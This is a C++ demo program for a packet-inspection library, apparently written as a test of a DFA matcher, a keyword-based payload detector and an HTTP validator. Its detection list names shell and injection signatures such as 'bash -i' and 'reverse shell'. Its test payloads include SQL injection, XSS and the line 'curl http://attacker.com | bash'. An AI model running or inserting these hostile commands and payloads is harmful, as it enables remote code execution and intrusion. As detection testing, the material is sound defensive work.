#include "packet_inspection/dfa/dfa_matcher.hpp"
#include "protocol_validation/http_pda/http_pda_validator.hpp"

#include <iostream>
#include <vector>

using automata::packet_inspection::dfa::DfaMatcher;
using automata::packet_inspection::dfa::PatternMatcher;
using automata::protocol_validation::http_pda::HttpPdaValidator;

int main() {
    // Example DFA that matches the literal string "GET".
    DfaMatcher dfa(0);
    dfa.add_transition(0, 'G', 1);
    dfa.add_transition(1, 'E', 2);
    dfa.add_transition(2, 'T', 3);
    dfa.add_accepting_state(3);

    std::cout << "=== Basic DFA Matching ===\n";
    std::cout << "DFA match on 'GET': " << (dfa.matches("GET") ? "true" : "false") << '\n';
    std::cout << "DFA match on 'POST': " << (dfa.matches("POST") ? "true" : "false") << '\n';

    // ========================================================================
    // CNF Pattern Matcher Integration for Payload Inspection
    // ========================================================================
    std::cout << "\n=== CNF Pattern-Based Payload Inspection ===\n";
    
    // Define malicious patterns (SQL injection, XSS, command injection, etc.)
    std::vector<std::string> malicious_patterns = {
        "virus",
        "malware",
        "exploit",
        "ransom",
        "<script",
        "</script",
        "base64",
        "eval",
        "<iframe",
        "'; OR 1",
        "UNION SELECT",
        "DROP TABLE",
        "cmd.exe",
        "bash -i",
        "reverse shell"
    };

    // Initialize pattern matcher with malicious signatures
    PatternMatcher pattern_matcher(malicious_patterns);
    dfa.set_pattern_matcher(pattern_matcher);

    // Test payloads
    std::cout << "\nTesting payloads:\n";
    std::vector<std::pair<std::string, bool>> test_cases = {
        {"GET /index.html HTTP/1.1", false},  // Benign
        {"GET /admin?id=1 OR 1=1 HTTP/1.1", true},  // SQL injection
        {"<script>alert('xss')</script>", true},  // XSS attack
        {"curl http://attacker.com | bash", true},  // Command injection
        {"base64 encoded payload here", true},  // Suspicious keyword
        {"Normal user agent request", false}  // Benign
    };

    for (const auto& [payload, expected_malicious] : test_cases) {
        bool is_malicious = dfa.inspect_payload(payload);
        std::cout << "\n  Payload: \"" << payload << "\"\n";
        std::cout << "  Detected as malicious: " << (is_malicious ? "YES" : "NO") << "\n";
        
        if (is_malicious) {
            auto anomalies = dfa.get_payload_anomalies(payload);
            std::cout << "  Matched patterns:\n";
            for (const auto& pattern : anomalies) {
                std::cout << "    - " << pattern << "\n";
            }
        }
        
        std::cout << "  Status: " << (is_malicious == expected_malicious ? "✓ PASS" : "✗ FAIL") << "\n";
    }

    // ========================================================================
    // Example HTTP PDA validation
    // ========================================================================
    std::cout << "\n=== HTTP PDA Protocol Validation ===\n";
    const std::string sample_request =
        "GET / HTTP/1.1\r\n"
        "Host: example.com\r\n"
        "User-Agent: test\r\n"
        "\r\n";

    HttpPdaValidator validator;
    auto result = validator.validate(sample_request);

    std::cout << "HTTP PDA validation result: ";
    switch (result) {
        case HttpPdaValidator::Result::Valid:
            std::cout << "Valid\n";
            break;
        case HttpPdaValidator::Result::Invalid:
            std::cout << "Invalid\n";
            break;
        case HttpPdaValidator::Result::Incomplete:
            std::cout << "Incomplete\n";
            break;
    }

    return 0;
}


